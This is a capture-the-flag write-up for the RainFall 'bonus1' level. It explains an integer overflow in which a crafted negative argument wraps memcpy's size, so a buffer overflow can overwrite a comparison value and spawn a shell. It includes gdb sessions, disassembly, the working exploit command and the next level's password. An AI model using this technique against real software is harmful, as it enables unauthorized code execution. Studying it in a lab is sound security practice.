As we can see in the source.c file, av[1] is converted to an int using atoi (stored in local_14).
Then there is a check : if this value is superior to 10, we exit the program without doing anything. That means av[1] can't be higher than 9.
Then there is a call to memcpy, that will copy av[2] to a buffer (local_3c). But it will only copy local_14 (max size 9) * 4 bytes, so at most 36 bytes. Then local_14 is checked again, this time with 0x574f4c46. If equal, a shell will be run.
So we obviously want this check to be equal, however we can't pass anything bigger than 9. The only vulerable function here is memcpy, but the max copy size will be 9 * 4 = 36 while the buffer size is 40.
What about negative numbers ?

    $ ./bonus1 -1 abc
    Segmentation fault (core dumped)

Obviously, it allocates a negative size to memcpy and it crashes. But we have to keep in mind that this number is multiplied by 4 before being passed to memcpy. So what if we pass a number that will be bigger than INT_MIN when multiplied by 4 ?
Lets take a bigger number than INT_MIN : -2,147,483,652 for instance (divisible by 4).
If we divide it by 4, we get -536,870,913.

Let's try with this number then :

    (gdb) r "-536870913" "AAAA"
    Starting program: /home/user/bonus1/bonus1 "-536870913" "AAAA"
    Breakpoint 1, 0x0804843d in main ()

    (gdb) i r
    eax            0xdfffffff	-536870913  <-- atoi return value
    [...]
    (gdb) c
    Continuing.

    Program received signal SIGSEGV, Segmentation fault.
    0xb7f65ef0 in ?? () from /lib/i386-linux-gnu/libc.so.6
    (gdb) x/x $esp+0x3c
    0xbffff704:	0x63363532
    (gdb) x/s $esp+0x3c
    0xbffff704:	 "256color"

[esp + 0x3c] corresponds to av[1], as seen in this disassembled code :

    0x08048478 <+84>:	cmp    DWORD PTR [esp+0x3c],0x574f4c46

This line corresponds to the check with the big value 0x574f4c46 being compared with av[1].
So we successfully overflowed it. Let's check the size passed to memcpy to get an idea :

    0x08048464 <+64>:	lea    eax,[esp+0x14]           <-- dest address
    0x08048468 <+68>:	mov    DWORD PTR [esp+0x8],ecx  <-- 3rd argument (size)
    0x0804846c <+72>:	mov    DWORD PTR [esp+0x4],edx  <-- 2nd argument (src)
    0x08048470 <+76>:	mov    DWORD PTR [esp],eax      <-- 1st argument (dest)
    0x08048473 <+79>:	call   0x8048320 <memcpy@plt>

We can see that the value of ecx is being moved to [esp+0x8], which is the 3rd argument passed when calling a function, here memcpy. That means this is the size passed to memcpy

    Breakpoint 3, 0x08048473 in main ()
    (gdb) i r
    eax            0xbffff6c4	-1073744188
    ecx            0x7ffffffc	2147483644  <-- size
    [...]

We end up with a buffer of 2,147,483,644. That means memcpy was successfully given a positive number. Why is that ?

The binary representation of -2,147,483,652 is :

    1111 1111 1111 1111 1111 1111 1111 1111 0111 1111 1111 1111 1111 1111 1111 1100

However, esp+0x3c is a DWORD (32bit), so only the 32 least significant bytes are counted.
We get this binary number :

    0111 1111 1111 1111 1111 1111 1111 1100

Which in decimal is 2,147,483,644. But this is a very large size, we only really need to end up with a size of 44, which in binary is 101100.
The 32bit representation would look like this :

    0000 0000 0000 0000 0000 0000 0010 1100

Now, we can reuse the 32 most significant bytes of the previous 64bit result. If we divide the result by 4, we will get the value we need to pass to argv[1].

Our 64bit number would be :

    1111 1111 1111 1111 1111 1111 1111 1111 0000 0000 0000 0000 0000 0000 0010 1100

Which in decimal is -4,294,967,252. Divided by 4, we get -1,073,741,813.

Let's check our buffer size :

    (gdb) r "-1073741813" "acb"
    Starting program: /home/user/bonus1/bonus1 "-1073741813" "acb"

    Breakpoint 1, 0x08048473 in main ()
    (gdb) i r
    eax            0xbffff6f4	-1073744140
    ecx            0x2c	44
    [...]

As we saw previously, av[1] is located at [esp+0x3c] (esp + 60), while the destination address of memcpy is located at [esp+0x14] (esp + 20). We can indeed see here that the buffer has a size of 40, and overflowing it will overvrite av[1]. That means we can craft our payload by padding the first 40 characters, then passing the value that will set av[1] to the correct number :

    bonus1@RainFall:~$ ./bonus1 "-1073741813" $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
    $ cd ../bonus2
    $ cat .pass
    579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
